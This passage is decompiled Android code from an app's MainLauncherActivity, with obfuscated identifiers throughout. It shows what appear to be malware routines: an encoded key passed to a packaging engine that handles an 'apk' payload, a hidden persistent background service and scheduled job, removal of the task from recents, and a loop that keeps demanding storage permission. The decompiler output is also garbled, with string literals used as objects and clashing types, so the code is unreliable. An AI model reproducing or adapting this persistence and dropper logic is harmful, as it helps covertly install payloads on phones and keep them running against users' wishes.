        2[1] = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
        v0.execute(2);
        MainLauncherActivity.getApplicationContext(...);
        DataPackagingEngine.minevpackagesktemporaryg34(v0, v11, "apk");
        MainLauncherActivity.finish(...);
        // goto (branch)
        v0.printStackTrace();
        // goto (branch)
        v0 = MainLauncherActivity.T_tunesxconcerningn109_P;
        MainLauncherActivity.getPackageManager(...);
        v0 = MainLauncherActivity.IP_tunesxconcerningn109_I(v0, 2);
        if (v0 == null || v0 == 0) { // goto +59
        v0 = MainLauncherActivity.T_tunesxconcerningn109_P;
        v0.toLowerCase();
        v0.equals("apk");
        if (v0 != null && v0 != 0) { // goto +47
        MainLauncherActivity.getApplicationContext(...);
        v2 = v0.getPackageManager();
        v2 = v0.getLaunchIntentForPackage(2);
        v2 = 268435456; // 0x10000000
        v0.addFlags(2);
        v1.startActivity(v0);
        v0 = new MainLauncherActivity$FI_tunesxconcerningn109_N();
        // new MainLauncherActivity$FI_tunesxconcerningn109_N(v1, 0)
        v2 = MainLauncherActivity.getApplicationContext(...);
        MainLauncherActivity$FI_tunesxconcerningn109_N.access$102(v0, 2);
        v2 = 2;
        2[0] = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
        2[1] = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
        v0.execute(2);
        // goto (branch)
        v0 = MainBackgroundService.class;
        MainLauncherActivity.getApplication(...);
        v0 = BackgroundServiceHelper.removedqtractort40(v0, 2);
        if (v0 == null || v0 == 0) { // goto +12
        v0 = new Intent();
        // new Intent(v1, 2)
        v1.startService(v0);
        MainLauncherActivity.getApplicationContext(...);
        MainLauncherActivity.schedule_tunesxconcerningn109_Job(v0);
        MainLauncherActivity.finish(...);
        return;
    }

    public void finish() {
        v0 = 1;
        MainLauncherActivity.IamDone = 1;
        v1.finishAndRemoveTask();
        return;
    }

    public void keepworking(Context param0) {
        v1 = v4.getApplicationContext();
        v1 = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
        v2 = 180000;
        DataPackagingEngine.phonixeffect(v0, "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147", 180000, v3);
        v0 = v4.StoragPermissions;
        v0 = MainLauncherActivity.hasPermissions(v5, v0);
        if (v0 != null && v0 != 0) { // goto +24
        v0 = MainLauncherActivity.T_tunesxconcerningn109_P;
        v0.toLowerCase();
        v5 = v0.equals("null");
        if (v0 != null && v0 != 0) { // goto +10
        v5 = v4.StoragPermissions;
        v0 = v4.PERMISSION_ALL;
        ActivityCompat.requestPermissions(v4, v5, v0);
        // goto (branch)
        v4.Check_tunesxconcerningn109_Bind();
        v0 = MainBackgroundService.class;
        v4.getApplication();
        v0 = BackgroundServiceHelper.removedqtractort40(v0, "null");
        if (v0 == null || v0 == 0) { // goto +12
        v0 = new Intent();
        // new Intent(v5, "null")
        v4.startService(v0);
        return;
    }

    public void onBackPressed() {
        v0.onBackPressed();
        return;
    }

    public void onCreate(Bundle param0) {
        v0 = "STR";
        v1 = "STO";
        v2 = "SIM";
        v3 = "SME";
        v4 = "";
        v7.onCreate(v8);
        v8 = 1;
        v7.requestWindowFeature(1);
        v6 = v7.getWindow();
        v6 = 1024;
        v5.setFlags(1024, 1024);
        v5 = 2131165184; // 0x7f070000
        v7.setContentView(v5);
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.read(v5, "SME", "");
        v5.length();
        if (v5 != null && v5 != 0) { // goto +9
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.Write(v5, "SME", "NO");
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.read("SME", "SIM", "");
        "SME".length();
        if ("SME" != null && "SME" != 0) { // goto +9
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.Write("SME", "SIM", "NO");
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.read("SIM", "STO", "");
        "SIM".length();
        if ("SIM" != null && "SIM" != 0) { // goto +9
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.Write("SIM", "STO", "NO");
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.read("STO", "STR", "");
        "STO".length();
        if ("STO" != null && "STO" != 0) { // goto +9
        v7.getApplicationContext();
        My_tunesxconcerningn10_Settings.Write("STO", "STR", "NO");
        // new Point()
        v7.getWindowManager();
        "STO".getDefaultDisplay();
        "STO".getRealSize("STR");
        v5 = v7.getApplicationContext();
        // new StringBuilder("")
        v5 = "STR".x;
        "SME".append(v5);
        "SME".toString();
        My_tunesxconcerningn10_Settings.Write("STO", "SCH", "SME");
        v7.getApplicationContext();
        // new StringBuilder("")
        "SME".append("STR");
        "SME".toString();
        My_tunesxconcerningn10_Settings.Write("STO", "SCW", "STR");
        // new MainLauncherActivity$MyExceptionHandler(v7, v7, "STO")
        Thread.setDefaultUncaughtExceptionHandler("STR");
        v7.getApplicationContext();
        MainBackgroundService.app_tunesxconcerningn1011_Context = "STR";
        // goto (branch)
        v1 = Boolean.valueOf(1);
        v1 = 1.booleanValue();
        v1 = 0;
        if ("STR" == null || "STR" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if ("STR" == null || "STR" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if ("STR" == null || "STR" == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v0 = v7.getApplicationContext();
        v0 = 1.getResources();
        v0 = 2131296274;
        1.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = 1;
        v2 = v7.getApplicationContext();
        // new Handler()
        // new MainLauncherActivity$1(v7, 1)
        v2 = 3000;
        2131296274.postDelayed(0, 3000, "SME");
        return;
    }

    public void onRequestPermissionsResult(int param0, String[] param1, int[] param2) {
        v0.onRequestPermissionsResult(v1, v2, v3);
        v2 = 555;
        if (v1 == 555) { // goto +3
        // goto (branch)
        v1 = v3.length;
        v2 = 0;
        if (v1 <= 0) { // goto +10
        v1 = v3[0];
        if (v1 != null && v1 != 0) { // goto +6
        v0.Check_tunesxconcerningn109_Bind();
        // goto (branch)
        v1 = "Please Allow Permission To Continue.";
        Toast.makeText(v0, "Please Allow Permission To Continue.", 0);
        "Please Allow Permission To Continue.".show();
        ActivityCompat.requestPermissions(v0, "Please Allow Permission To Continue.", 0);
        return;
    }
}
